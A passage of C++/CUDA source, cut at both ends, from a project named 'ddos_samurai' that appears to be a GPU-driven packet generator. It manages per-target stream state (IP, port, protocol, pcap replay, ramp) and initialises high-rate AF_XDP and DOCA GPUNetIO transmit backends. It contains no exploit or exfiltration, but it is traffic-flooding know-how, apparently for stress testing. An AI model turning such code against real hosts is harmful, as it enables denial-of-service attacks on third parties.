          cr.update_ring_dev + ring_index,
          &cr.update_ring[ring_index],
          sizeof(ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1),
          cudaMemcpyHostToDevice) != cudaSuccess ||
      cudaMemcpy(cr.ring_head_dev + shard, &cr.ring_head[shard], sizeof(uint64_t), cudaMemcpyHostToDevice) !=
          cudaSuccess ||
      cudaMemcpy(
          cr.hot_flow_table_dev + flow_id,
          &cr.hot_flow_table[flow_id],
          sizeof(ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1),
          cudaMemcpyHostToDevice) != cudaSuccess ||
      cudaMemcpy(
          cr.hot_flow_versions_dev + flow_id,
          &cr.hot_flow_versions[flow_id],
          sizeof(uint64_t),
          cudaMemcpyHostToDevice) != cudaSuccess ||
      cudaMemcpy(
          cr.hot_flow_epochs_dev + flow_id,
          &cr.hot_flow_epochs[flow_id],
          sizeof(uint64_t),
          cudaMemcpyHostToDevice) != cudaSuccess) {
    cr.device_sync_error_count += 1u;
    return false;
  }
  return true;
}

inline bool persistent_contract_runtime_refresh_device_tail_unlocked(PersistentContractRuntime& cr, size_t shard) {
  if (!cr.device_mirror_initialized || !cr.ring_tail_dev || shard >= cr.ring_tail.size()) {
    return true;
  }
  uint64_t device_tail = 0u;
  if (cudaMemcpy(&device_tail, cr.ring_tail_dev + shard, sizeof(device_tail), cudaMemcpyDeviceToHost) != cudaSuccess) {
    cr.device_sync_error_count += 1u;
    return false;
  }
  if (device_tail > cr.ring_tail[shard]) {
    cr.ring_tail[shard] = device_tail;
  }
  return true;
}

inline bool persistent_contract_runtime_sync_device_tail_unlocked(PersistentContractRuntime& cr, size_t shard) {
  if (!cr.device_mirror_initialized || !cr.ring_tail_dev || shard >= cr.ring_tail.size()) {
    return true;
  }
  if (cudaMemcpy(cr.ring_tail_dev + shard, &cr.ring_tail[shard], sizeof(uint64_t), cudaMemcpyHostToDevice) !=
      cudaSuccess) {
    cr.device_sync_error_count += 1u;
    return false;
  }
  return true;
}

inline bool persistent_contract_runtime_ensure_started_unlocked(const PersistentRuntime& rt) {
  auto& cr = g_persistent_contract_runtime;
  if (cr.initialized) {
    return true;
  }
  auto clamp_local = [](int v, int lo, int hi) -> int {
    if (v < lo) {
      return lo;
    }
    if (v > hi) {
      return hi;
    }
    return v;
  };
  auto env_int_local_contract = [](const char* name, int defv) -> int {
    const char* v = std::getenv(name);
    if (!v || !*v) {
      return defv;
    }
    try {
      return std::stoi(v);
    } catch (...) {
      return defv;
    }
  };
  auto env_string_or_contract = [](const char* name, const std::string& defv) -> std::string {
    const char* v = std::getenv(name);
    if (!v || !*v) {
      return defv;
    }
    return std::string(v);
  };
  auto lower_copy_contract = [](std::string s) -> std::string {
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return s;
  };
  const int shard_default = std::max(1, rt.queue_count);
  const int ring_default = 1024;
  const int hot_default = kPersistentMaxStreams;

  auto parse_overflow_policy = [&](const std::string& raw)
      -> ddos_samurai::gpu_packet_cuda::zero_copy::RingOverflowPolicy {
    const std::string v = lower_copy_contract(raw);
    if (v == "hard_fail" || v == "hardfail" || v == "fail") {
      return ddos_samurai::gpu_packet_cuda::zero_copy::RingOverflowPolicy::kHardFail;
    }
    return ddos_samurai::gpu_packet_cuda::zero_copy::RingOverflowPolicy::kControlledDrop;
  };

  cr.shard_count = clamp_local(env_int_local_contract("SAMURAI_GPU_CONTRACT_SHARDS", shard_default), 1, 256);
  cr.ring_slots_per_shard = clamp_local(
      env_int_local_contract("SAMURAI_GPU_CONTRACT_RING_SLOTS", ring_default), 64, 65536);
  cr.hot_flow_capacity = clamp_local(
      env_int_local_contract("SAMURAI_GPU_CONTRACT_HOT_FLOW_CAPACITY", hot_default), 1, 1 << 20);
  cr.overflow_policy = parse_overflow_policy(
      env_string_or_contract("SAMURAI_GPU_CONTRACT_RING_OVERFLOW", "controlled_drop"));

  const size_t shard_count_s = static_cast<size_t>(cr.shard_count);
  const size_t ring_slots_s = static_cast<size_t>(cr.ring_slots_per_shard);
  const size_t ring_total = shard_count_s * ring_slots_s;
  try {
    cr.update_ring.assign(ring_total, ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1{});
    cr.ring_head.assign(shard_count_s, 0u);
    cr.ring_tail.assign(shard_count_s, 0u);
    cr.ring_drop_by_shard.assign(shard_count_s, 0u);
    cr.hot_flow_table.assign(
        static_cast<size_t>(cr.hot_flow_capacity),
        ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1{});
    cr.hot_flow_versions.assign(static_cast<size_t>(cr.hot_flow_capacity), 0u);
    cr.hot_flow_epochs.assign(static_cast<size_t>(cr.hot_flow_capacity), 0u);
  } catch (...) {
    persistent_contract_runtime_release_unlocked();
    return false;
  }
  if (!persistent_contract_runtime_alloc_device_mirror_unlocked(
          cr,
          ring_total,
          shard_count_s,
          static_cast<size_t>(cr.hot_flow_capacity))) {
    persistent_contract_runtime_release_unlocked();
    return false;
  }
  cr.publish_count = 0u;
  cr.drop_count = 0u;
  cr.version_gap_count = 0u;
  cr.epoch_mismatch_count = 0u;
  cr.device_sync_error_count = 0u;
  cr.initialized = true;
  return true;
}

inline void host_u64_add(volatile uint64_t* p, uint64_t v) {
  if (!p || v == 0u) {
    return;
  }
  (void)__atomic_fetch_add(reinterpret_cast<unsigned long long*>(const_cast<uint64_t*>(p)),
                           static_cast<unsigned long long>(v),
                           __ATOMIC_RELAXED);
}

inline uint64_t host_u64_load(const volatile uint64_t* p) {
  if (!p) {
    return 0u;
  }
  return static_cast<uint64_t>(__atomic_load_n(
      reinterpret_cast<const volatile unsigned long long*>(p),
      __ATOMIC_RELAXED));
}

inline void host_u32_add(volatile uint32_t* p, uint32_t v) {
  if (!p || v == 0u) {
    return;
  }
  (void)__atomic_fetch_add(reinterpret_cast<unsigned int*>(const_cast<uint32_t*>(p)),
                           static_cast<unsigned int>(v),
                           __ATOMIC_RELAXED);
}

inline uint32_t host_u32_load(const volatile uint32_t* p) {
  if (!p) {
    return 0u;
  }
  return static_cast<uint32_t>(__atomic_load_n(
      reinterpret_cast<const volatile unsigned int*>(p),
      __ATOMIC_RELAXED));
}

inline bool persistent_stream_copy_slots_to_host_batch(
    PersistentRuntime& rt,
    const int* slots,
    size_t slot_count);

inline bool persistent_stream_write_u32_field_batch(
    PersistentRuntime& rt,
    const int* slots,
    const uint32_t* values,
    size_t slot_count,
    size_t field_offset);

inline bool persistent_sync_hot_stream_slot(PersistentRuntime& rt, int slot) {
  if (!rt.streams || !rt.streams_hot_dev || slot < 0 || slot >= kPersistentMaxStreams) {
    return false;
  }
  const PersistentDeviceStreamState& src = rt.streams[slot];
  PersistentStreamHotState hot{};
  hot.active = src.active;
  hot.stream_id = src.stream_id;
  hot.protocol = src.protocol;
  hot.queue_affinity = src.queue_affinity;
  hot.target_ip = src.target_ip;
  hot.target_port = src.target_port;
  return cudaMemcpy(
             rt.streams_hot_dev + static_cast<size_t>(slot),
             &hot,
             sizeof(hot),
             cudaMemcpyHostToDevice) == cudaSuccess;
}

inline bool persistent_stream_copy_slot_to_device(PersistentRuntime& rt, int slot) {
  if (!rt.streams || !rt.streams_dev || slot < 0 || slot >= kPersistentMaxStreams) {
    return false;
  }
  return cudaMemcpy(
             rt.streams_dev + static_cast<size_t>(slot),
             rt.streams + static_cast<size_t>(slot),
             sizeof(PersistentDeviceStreamState),
             cudaMemcpyHostToDevice) == cudaSuccess;
}

inline bool persistent_stream_copy_slot_to_host(PersistentRuntime& rt, int slot) {
  if (slot < 0 || slot >= kPersistentMaxStreams) {
    return false;
  }
  return persistent_stream_copy_slots_to_host_batch(rt, &slot, 1u);
}

inline bool persistent_stream_copy_all_to_host(PersistentRuntime& rt) {
  if (!rt.streams || !rt.streams_dev) {
    return false;
  }
  if (!rt.quota_refill_stream) {
    if (cudaStreamCreateWithFlags(&rt.quota_refill_stream, cudaStreamNonBlocking) != cudaSuccess) {
      return false;
    }
  }
  std::array<uint32_t, kPersistentMaxStreams> completed_before{};
  for (int i = 0; i < kPersistentMaxStreams; ++i) {
    completed_before[static_cast<size_t>(i)] = rt.streams[static_cast<size_t>(i)].completed;
  }
  const size_t bytes = sizeof(PersistentDeviceStreamState) * static_cast<size_t>(kPersistentMaxStreams);
  if (cudaMemcpyAsync(rt.streams, rt.streams_dev, bytes, cudaMemcpyDeviceToHost, rt.quota_refill_stream) !=
      cudaSuccess) {
    return false;
  }
  if (cudaStreamSynchronize(rt.quota_refill_stream) != cudaSuccess) {
    return false;
  }
  for (int i = 0; i < kPersistentMaxStreams; ++i) {
    PersistentDeviceStreamState& d = rt.streams[static_cast<size_t>(i)];
    const uint32_t prev = completed_before[static_cast<size_t>(i)];
    if (prev > d.completed) {
      d.completed = prev;
    }
  }
  return true;
}

inline bool persistent_stream_copy_slots_to_host_batch(
    PersistentRuntime& rt,
    const int* slots,
    size_t slot_count) {
  if (!rt.streams || !rt.streams_dev) {
    return false;
  }
  if (slot_count == 0u) {
    return true;
  }
  if (!slots) {
    return false;
  }
  if (!rt.quota_refill_stream) {
    if (cudaStreamCreateWithFlags(&rt.quota_refill_stream, cudaStreamNonBlocking) != cudaSuccess) {
      return false;
    }
  }

  std::vector<int> uniq_slots;
  uniq_slots.reserve(slot_count);
  for (size_t i = 0; i < slot_count; ++i) {
    const int slot = slots[i];
    if (slot < 0 || slot >= kPersistentMaxStreams) {
      continue;
    }
    uniq_slots.push_back(slot);
  }
  if (uniq_slots.empty()) {
    return false;
  }
  std::sort(uniq_slots.begin(), uniq_slots.end());
  uniq_slots.erase(std::unique(uniq_slots.begin(), uniq_slots.end()), uniq_slots.end());

  std::vector<uint32_t> completed_before(uniq_slots.size(), 0u);
  for (size_t i = 0; i < uniq_slots.size(); ++i) {
    completed_before[i] = rt.streams[static_cast<size_t>(uniq_slots[i])].completed;
  }

  size_t run_begin = 0u;
  while (run_begin < uniq_slots.size()) {
    size_t run_end = run_begin + 1u;
    while (run_end < uniq_slots.size() && uniq_slots[run_end] == uniq_slots[run_end - 1u] + 1) {
      ++run_end;
    }
    const int slot_start = uniq_slots[run_begin];
    const size_t run_len = run_end - run_begin;
    const size_t bytes = run_len * sizeof(PersistentDeviceStreamState);
    if (cudaMemcpyAsync(
            rt.streams + static_cast<size_t>(slot_start),
            rt.streams_dev + static_cast<size_t>(slot_start),
            bytes,
            cudaMemcpyDeviceToHost,
            rt.quota_refill_stream) != cudaSuccess) {
      return false;
    }
    run_begin = run_end;
  }
  if (cudaStreamSynchronize(rt.quota_refill_stream) != cudaSuccess) {
    return false;
  }

  for (size_t i = 0; i < uniq_slots.size(); ++i) {
    PersistentDeviceStreamState& d = rt.streams[static_cast<size_t>(uniq_slots[i])];
    const uint32_t prev = completed_before[i];
    if (prev > d.completed) {
      d.completed = prev;
    }
  }
  return true;
}

inline bool persistent_stream_write_u32_field_batch(
    PersistentRuntime& rt,
    const int* slots,
    const uint32_t* values,
    size_t slot_count,
    size_t field_offset) {
  if (!rt.streams_dev) {
    return false;
  }
  if (slot_count == 0u) {
    return true;
  }
  if (!slots || !values) {
    return false;
  }
  if (!rt.quota_refill_stream) {
    if (cudaStreamCreateWithFlags(&rt.quota_refill_stream, cudaStreamNonBlocking) != cudaSuccess) {
      return false;
    }
  }

  struct SlotValue {
    int slot = -1;
    uint32_t value = 0u;
  };
  std::vector<SlotValue> slot_values;
  slot_values.reserve(slot_count);
  for (size_t i = 0; i < slot_count; ++i) {
    const int slot = slots[i];
    if (slot < 0 || slot >= kPersistentMaxStreams) {
      continue;
    }
    slot_values.push_back(SlotValue{slot, values[i]});
  }
  if (slot_values.empty()) {
    return false;
  }
  std::sort(slot_values.begin(), slot_values.end(), [](const SlotValue& a, const SlotValue& b) {
    return a.slot < b.slot;
  });
  std::vector<SlotValue> dedup;
  dedup.reserve(slot_values.size());
  for (const SlotValue& sv : slot_values) {
    if (!dedup.empty() && dedup.back().slot == sv.slot) {
      dedup.back().value = sv.value;
    } else {
      dedup.push_back(sv);
    }
  }

  size_t run_begin = 0u;
  while (run_begin < dedup.size()) {
    size_t run_end = run_begin + 1u;
    while (run_end < dedup.size() && dedup[run_end].slot == dedup[run_end - 1u].slot + 1) {
      ++run_end;
    }
    const int slot_start = dedup[run_begin].slot;
    const size_t run_len = run_end - run_begin;
    std::vector<uint32_t> run_values(run_len, 0u);
    for (size_t i = 0; i < run_len; ++i) {
      run_values[i] = dedup[run_begin + i].value;
    }
    uint8_t* dst = reinterpret_cast<uint8_t*>(rt.streams_dev + static_cast<size_t>(slot_start)) + field_offset;
    if (cudaMemcpy2DAsync(
            dst,
            sizeof(PersistentDeviceStreamState),
            run_values.data(),
            sizeof(uint32_t),
            sizeof(uint32_t),
            run_len,
            cudaMemcpyHostToDevice,
            rt.quota_refill_stream) != cudaSuccess) {
      return false;
    }
    run_begin = run_end;
  }
  return cudaStreamSynchronize(rt.quota_refill_stream) == cudaSuccess;
}

inline void persistent_sync_active_stream_count_unlocked(PersistentRuntime& rt) {
  if (!rt.ctrl) {
    return;
  }
  int active = 0;
  for (const auto& kv : g_persistent_streams) {
    if (kv.second.active != 0 && kv.second.device_slot >= 0 && kv.second.device_slot < kPersistentMaxStreams) {
      active += 1;
    }
  }
  if (active < 0) {
    active = 0;
  } else if (active > kPersistentMaxStreams) {
    active = kPersistentMaxStreams;
  }
  rt.ctrl->active_streams = active;
}

template <typename T>
inline bool persistent_stream_read_field(
    PersistentRuntime& rt,
    int slot,
    size_t field_offset,
    T* out) {
  if (!rt.streams_dev || !out || slot < 0 || slot >= kPersistentMaxStreams) {
    return false;
  }
  const uint8_t* base = reinterpret_cast<const uint8_t*>(rt.streams_dev + static_cast<size_t>(slot));
  return cudaMemcpy(out, base + field_offset, sizeof(T), cudaMemcpyDeviceToHost) == cudaSuccess;
}

template <typename T>
inline bool persistent_stream_write_field(
    PersistentRuntime& rt,
    int slot,
    size_t field_offset,
    const T& value) {
  if (!rt.streams_dev || slot < 0 || slot >= kPersistentMaxStreams) {
    return false;
  }
  uint8_t* base = reinterpret_cast<uint8_t*>(rt.streams_dev + static_cast<size_t>(slot));
  return cudaMemcpy(base + field_offset, &value, sizeof(T), cudaMemcpyHostToDevice) == cudaSuccess;
}

inline std::string json_escape_string(const std::string& in) {
  std::string out;
  out.reserve(in.size() + 16);
  for (char c : in) {
    switch (c) {
      case '\\':
        out += "\\\\";
        break;
      case '"':
        out += "\\\"";
        break;
      case '\n':
        out += "\\n";
        break;
      case '\r':
        out += "\\r";
        break;
      case '\t':
        out += "\\t";
        break;
      default:
        out.push_back(c);
        break;
    }
  }
  return out;
}

inline std::string json_value_raw(const std::string& json, const char* key) {
  if (json.empty() || !key || !*key) {
    return {};
  }
  const std::string needle = "\"" + std::string(key) + "\"";
  size_t p = json.find(needle);
  if (p == std::string::npos) {
    return {};
  }
  p = json.find(':', p + needle.size());
  if (p == std::string::npos) {
    return {};
  }
  ++p;
  while (p < json.size() && std::isspace(static_cast<unsigned char>(json[p]))) {
    ++p;
  }
  if (p >= json.size()) {
    return {};
  }
  if (json[p] == '"') {
    ++p;
    size_t e = p;
    while (e < json.size() && json[e] != '"') {
      if (json[e] == '\\' && e + 1 < json.size()) {
        e += 2;
      } else {
        ++e;
      }
    }
    return json.substr(p, e - p);
  }
  size_t e = p;
  while (e < json.size() && json[e] != ',' && json[e] != '}') {
    ++e;
  }
  std::string raw = json.substr(p, e - p);
  while (!raw.empty() && std::isspace(static_cast<unsigned char>(raw.back()))) {
    raw.pop_back();
  }
  return raw;
}

inline int json_get_int(const std::string& json, const char* key, int defv) {
  const std::string raw = json_value_raw(json, key);
  if (raw.empty()) {
    return defv;
  }
  try {
    return std::stoi(raw);
  } catch (...) {
    return defv;
  }
}

inline uint64_t json_get_u64(const std::string& json, const char* key, uint64_t defv) {
  const std::string raw = json_value_raw(json, key);
  if (raw.empty()) {
    return defv;
  }
  try {
    return static_cast<uint64_t>(std::stoull(raw));
  } catch (...) {
    return defv;
  }
}

inline uint32_t json_get_ip(const std::string& json, const char* key, uint32_t defv) {
  const std::string raw = json_value_raw(json, key);
  if (raw.empty()) {
    return defv;
  }
  try {
    return ddos_samurai::gpu_packet_cuda::ip_to_int(raw);
  } catch (...) {
    return defv;
  }
}

inline std::string json_get_string(const std::string& json, const char* key, const std::string& defv = std::string()) {
  const std::string raw = json_value_raw(json, key);
  return raw.empty() ? defv : raw;
}

inline bool json_get_bool(const std::string& json, const char* key, bool defv = false) {
  std::string raw = json_value_raw(json, key);
  std::transform(raw.begin(), raw.end(), raw.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
  if (raw.empty()) {
    return defv;
  }
  if (raw == "1" || raw == "true" || raw == "yes" || raw == "on") {
    return true;
  }
  if (raw == "0" || raw == "false" || raw == "no" || raw == "off") {
    return false;
  }
  return defv;
}

inline int protocol_from_string(const std::string& protocol, int defv = 6) {
  std::string proto = protocol;
  std::transform(proto.begin(), proto.end(), proto.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
  if (proto == "tcp") {
    return 6;
  }
  if (proto == "udp") {
    return 17;
  }
  if (proto == "icmp") {
    return 1;
  }
  return defv;
}

inline const char* protocol_name_from_int(int proto) {
  if (proto == 6) {
    return "tcp";
  }
  if (proto == 17) {
    return "udp";
  }
  if (proto == 1) {
    return "icmp";
  }
  return "unknown";
}

inline PersistentStreamKind stream_kind_from_string(const std::string& stream_type, int protocol) {
  std::string t = stream_type;
  std::transform(t.begin(), t.end(), t.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
  if (t == "icmp") {
    return PersistentStreamKind::kIcmp;
  }
  if (t == "pcap_replay" || t == "pcap-replay" || t == "pcap") {
    return PersistentStreamKind::kPcapReplay;
  }
  if (t == "ramp") {
    return PersistentStreamKind::kRamp;
  }
  if (protocol == 1) {
    return PersistentStreamKind::kIcmp;
  }
  return PersistentStreamKind::kL4;
}

inline int clamp_i(int v, int lo, int hi) {
  if (v < lo) {
    return lo;
  }
  if (v > hi) {
    return hi;
  }
  return v;
}

inline int env_int_local(const char* name, int defv) {
  const char* v = std::getenv(name);
  if (!v || !*v) {
    return defv;
  }
  try {
    return std::stoi(v);
  } catch (...) {
    return defv;
  }
}

inline std::string env_string_or(const char* name, const std::string& defv = std::string()) {
  const char* v = std::getenv(name);
  if (!v) {
    return defv;
  }
  std::string out(v);
  if (out.empty()) {
    return defv;
  }
  return out;
}

inline std::vector<uint8_t> parse_hex_payload(const std::string& hex_raw) {
  std::string hex = hex_raw;
  hex.erase(std::remove_if(hex.begin(), hex.end(), [](unsigned char c) { return std::isspace(c) != 0; }), hex.end());
  if (hex.rfind("0x", 0) == 0 || hex.rfind("0X", 0) == 0) {
    hex = hex.substr(2);
  }
  if (hex.empty()) {
    return {};
  }
  if (hex.size() % 2 != 0) {
    hex = "0" + hex;
  }
  std::vector<uint8_t> out;
  out.reserve(hex.size() / 2);
  auto hex_nib = [](char c) -> int {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
    if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
    return -1;
  };
  for (size_t i = 0; i + 1 < hex.size(); i += 2) {
    const int hi = hex_nib(hex[i]);
    const int lo = hex_nib(hex[i + 1]);
    if (hi < 0 || lo < 0) {
      return {};
    }
    out.push_back(static_cast<uint8_t>((hi << 4) | lo));
  }
  return out;
}

inline std::string lower_copy(std::string s) {
  std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
  return s;
}

inline bool parse_mac_string(const std::string& mac_str, std::array<uint8_t, 6>& out) {
  if (mac_str.empty()) {
    return false;
  }
  unsigned int b[6]{0, 0, 0, 0, 0, 0};
  if (std::sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) {
    return false;
  }
  for (int i = 0; i < 6; ++i) {
    out[static_cast<size_t>(i)] = static_cast<uint8_t>(b[i] & 0xFFu);
  }
  return true;
}

inline void bridge_wait_until_ns(uint64_t target_ns) {
  if (target_ns == 0u) {
    return;
  }
  if (samurai_pacing_precision_wait_ns && samurai_pacing_time_ns) {
    samurai_pacing_precision_wait_ns(target_ns);
    return;
  }
  const uint64_t now = static_cast<uint64_t>(
      std::chrono::duration_cast<std::chrono::nanoseconds>(
          std::chrono::steady_clock::now().time_since_epoch())
          .count());
  if (target_ns <= now) {
    return;
  }
  const uint64_t delta = target_ns - now;
  std::this_thread::sleep_for(std::chrono::nanoseconds(delta));
}

inline void persistent_bridge_backend_shutdown_unlocked(PersistentRuntime& rt) {
  auto& b = rt.tx_bridge;
  if (b.xdp_api) {
    for (int h : b.xdp_handles) {
      if (h >= 0 && b.xdp_api->destroy_ctx) {
        char errbuf[160];
        errbuf[0] = '\0';
        (void)b.xdp_api->destroy_ctx(h, errbuf, sizeof(errbuf));
      }
    }
  }
  b.xdp_handles.clear();
  if (b.doca_api && b.doca_api->destroy_txq) {
    for (int h : b.doca_txq_handles) {
      if (h >= 0) {
        char errbuf[160];
        errbuf[0] = '\0';
        (void)b.doca_api->destroy_txq(h, errbuf, sizeof(errbuf));
      }
    }
  }
  b.doca_txq_handles.clear();
  b.doca_gpu_txq_handles.clear();
  b.doca_txq_mkeys_be.clear();
  b.doca_kernel_direct_tx = false;
  b.doca_timed_tx_enabled = false;
  b.doca_timed_tx_required = false;
  if (b.afpacket_cleanup_bridge) {
    (void)b.afpacket_cleanup_bridge();
  }
  b.kind = PersistentTxBackendKind::kNoop;
  b.active = "noop";
  b.xdp_api = nullptr;
  b.doca_api = nullptr;
  b.afpacket_send_bridge = nullptr;
  b.afpacket_cleanup_bridge = nullptr;
}

inline bool persistent_bridge_backend_init_unlocked(PersistentRuntime& rt) {
  auto& b = rt.tx_bridge;
  persistent_bridge_backend_shutdown_unlocked(rt);

  b.requested = lower_copy(env_string_or("SAMURAI_GPU_TX_BACKEND", "auto"));
  b.iface = env_string_or("SAMURAI_GPU_TX_INTERFACE", env_string_or("SAMURAI_XDP_INTERFACE", ""));
  b.doca_device = env_string_or("SAMURAI_GPU_DOCA_DEVICE", "");
  b.doca_gpu_id = std::max(0, env_int_local("SAMURAI_GPU_DOCA_GPU_ID", 0));
  const bool tx_backend_strict = env_int_local("SAMURAI_GPU_TX_BACKEND_STRICT", 0) != 0;
  b.xdp_mode = clamp_i(env_int_local("SAMURAI_XDP_MODE", 0), 0, 2);
  b.xdp_queue_base = std::max(0, env_int_local("SAMURAI_XDP_QUEUE_ID", 0));
  {
    std::array<uint8_t, 6> mac{};
    if (parse_mac_string(env_string_or("SAMURAI_GPU_TX_MAC", "ff:ff:ff:ff:ff:ff"), mac)) {
      b.afpacket_mac = mac;
    }
  }

  if (b.requested != "auto" && b.requested != "af_xdp" && b.requested != "af_packet" &&
      b.requested != "doca_gpunetio" && b.requested != "noop") {
    if (tx_backend_strict) {
      b.kind = PersistentTxBackendKind::kNoop;
      b.active = "noop";
      return false;
    }
    b.requested = "auto";
  }
  if (b.requested == "noop") {
    b.kind = PersistentTxBackendKind::kNoop;
    b.active = "noop";
    return true;
  }

  const bool want_xdp = (b.requested == "auto" || b.requested == "af_xdp");
  const bool want_afpacket = (b.requested == "auto" || b.requested == "af_packet");
  const bool want_doca = (b.requested == "auto" || b.requested == "doca_gpunetio");
  const std::string doca_timed_tx_raw = lower_copy(env_string_or("SAMURAI_GPU_DOCA_TIMED_TX", "auto"));
  b.doca_timed_tx_enabled = false;
  b.doca_timed_tx_required = false;
  if (doca_timed_tx_raw == "1" || doca_timed_tx_raw == "true" || doca_timed_tx_raw == "yes" ||
      doca_timed_tx_raw == "on" || doca_timed_tx_raw == "force" || doca_timed_tx_raw == "required") {
    b.doca_timed_tx_enabled = true;
    b.doca_timed_tx_required = true;
  } else if (doca_timed_tx_raw == "0" || doca_timed_tx_raw == "false" || doca_timed_tx_raw == "no" ||
             doca_timed_tx_raw == "off") {
    b.doca_timed_tx_enabled = false;
    b.doca_timed_tx_required = false;
  } else {
    b.doca_timed_tx_enabled = true;
    b.doca_timed_tx_required = false;
  }
  const std::string doca_kernel_mode_raw = lower_copy(env_string_or("SAMURAI_GPU_DOCA_KERNEL_TX", "auto"));
  bool want_doca_kernel_direct = false;
  bool doca_kernel_mode_forced = false;
  if (doca_kernel_mode_raw == "1" || doca_kernel_mode_raw == "true" || doca_kernel_mode_raw == "yes" ||
      doca_kernel_mode_raw == "on" || doca_kernel_mode_raw == "force") {
    want_doca_kernel_direct = true;
    doca_kernel_mode_forced = true;
  } else if (doca_kernel_mode_raw == "0" || doca_kernel_mode_raw == "false" || doca_kernel_mode_raw == "no" ||
             doca_kernel_mode_raw == "off") {
    want_doca_kernel_direct = false;
    doca_kernel_mode_forced = true;
  } else {
    // auto: explicit DOCA backend seçildiyse kernel-direct yolu varsayılan olarak dene.
    want_doca_kernel_direct = (b.requested == "doca_gpunetio");
    doca_kernel_mode_forced = false;
  }
#if !SAMURAI_WITH_DOCA_GPUNETIO_DEVICE
  if (want_doca_kernel_direct && doca_kernel_mode_forced) {
    b.kind = PersistentTxBackendKind::kNoop;
    b.active = "noop";
    return false;
  }
  want_doca_kernel_direct = false;
#endif
  if (want_xdp && !b.iface.empty()) {
    if (samurai_xdp_get_native_api_v1) {
      b.xdp_api = samurai_xdp_get_native_api_v1();
      if (b.xdp_api && b.xdp_api->version == kXdpNativeApiVersion && b.xdp_api->create_ctx_external_umem &&
          b.xdp_api->submit_frame_ids && b.xdp_api->reap_completions && b.xdp_api->destroy_ctx) {
        b.xdp_handles.assign(static_cast<size_t>(rt.queue_count), -1);
        bool ok = true;
        for (int q = 0; q < rt.queue_count; ++q) {
          char errbuf[160];
          errbuf[0] = '\0';
          const int queue_id = b.xdp_queue_base + q;
          uint8_t* q_payload = rt.payload_host +
                               (static_cast<size_t>(q) * static_cast<size_t>(rt.ring_slots) *
                                static_cast<size_t>(kPersistentUmemFrameSize));
          const size_t q_payload_len =
              static_cast<size_t>(rt.ring_slots) * static_cast<size_t>(kPersistentUmemFrameSize);
          const int h = b.xdp_api->create_ctx_external_umem(
              b.iface.c_str(),
              queue_id,
              b.xdp_mode,
              static_cast<void*>(q_payload),
              q_payload_len,
              kPersistentUmemFrameSize,
              kPersistentUmemHeadroom,
              rt.ring_slots,
              errbuf,
              sizeof(errbuf));
          if (h < 0) {
            ok = false;
            break;
          }
          b.xdp_handles[static_cast<size_t>(q)] = h;
        }
        if (ok) {
          b.kind = PersistentTxBackendKind::kAfXdp;
          b.active = "af_xdp";
          return true;
        }
        for (int h : b.xdp_handles) {
          if (h >= 0) {
            char derr[96];
            derr[0] = '\0';
            (void)b.xdp_api->destroy_ctx(h, derr, sizeof(derr));
          }
        }
        b.xdp_handles.clear();
      }
    }
    if (b.requested == "af_xdp") {
      b.kind = PersistentTxBackendKind::kNoop;
      b.active = "noop";
      return false;
    }
  }

  if (want_doca && !b.iface.empty() && !b.doca_device.empty()) {
    if (ddos_samurai::gpu_packet_cuda::samurai_doca_gpunetio_get_api_v1) {
      b.doca_api = reinterpret_cast<const PersistentDocaGpuNetioApiV1*>(
          ddos_samurai::gpu_packet_cuda::samurai_doca_gpunetio_get_api_v1());
      if (b.doca_api && b.doca_api->version >= 2 && b.doca_api->create_txq &&
          b.doca_api->destroy_txq && b.doca_api->send_vector) {
        if (b.doca_timed_tx_required &&
            (b.doca_api->version < kPersistentDocaGpuNetioApiVersion || !b.doca_api->send_vector_timed)) {
          if (b.requested == "doca_gpunetio" || tx_backend_strict) {
            b.kind = PersistentTxBackendKind::kNoop;
            b.active = "noop";
            return false;
          }
          b.doca_timed_tx_enabled = false;
        }
        if (b.doca_api->version < kPersistentDocaGpuNetioApiVersion || !b.doca_api->send_vector_timed) {
          b.doca_timed_tx_enabled = false;
        }
        const bool api_has_kernel_hooks = (b.doca_api->get_gpu_txq_handle && b.doca_api->get_txq_mkey_be);
        if (want_doca_kernel_direct && !api_has_kernel_hooks) {
          if (b.requested == "doca_gpunetio") {
            b.kind = PersistentTxBackendKind::kNoop;
            b.active = "noop";
            return false;
          }
          want_doca_kernel_direct = false;
        }
        b.doca_txq_handles.assign(static_cast<size_t>(rt.queue_count), -1);
        if (want_doca_kernel_direct) {
          b.doca_gpu_txq_handles.assign(static_cast<size_t>(rt.queue_count), 0ull);
          b.doca_txq_mkeys_be.assign(static_cast<size_t>(rt.queue_count), 0u);
        }
        bool ok = true;
        for (int q = 0; q < rt.queue_count; ++q) {
          char errbuf[160];
          errbuf[0] = '\0';
          int handle = -1;
          const int rc = b.doca_api->create_txq(
              b.iface.c_str(),
              b.doca_device.c_str(),
              b.doca_gpu_id,
              q,
              &handle,
              errbuf,
              sizeof(errbuf));
          if (rc < 0 || handle < 0) {
            ok = false;
            break;
          }
          b.doca_txq_handles[static_cast<size_t>(q)] = handle;
          if (want_doca_kernel_direct) {
            uint64_t gpu_txq_handle = 0ull;
            uint32_t mkey_be = 0u;
            if (b.doca_api->get_gpu_txq_handle(
                    handle,
                    &gpu_txq_handle,
                    errbuf,
                    sizeof(errbuf)) < 0 ||
                gpu_txq_handle == 0ull ||
                b.doca_api->get_txq_mkey_be(
                    handle,
                    &mkey_be,
                    errbuf,
                    sizeof(errbuf)) < 0 ||
                mkey_be == 0u) {
              ok = false;
              break;
            }
            b.doca_gpu_txq_handles[static_cast<size_t>(q)] = gpu_txq_handle;
            b.doca_txq_mkeys_be[static_cast<size_t>(q)] = mkey_be;
          }
        }
        if (ok) {
          b.kind = PersistentTxBackendKind::kDocaGpuNetIO;
          b.active = "doca_gpunetio";
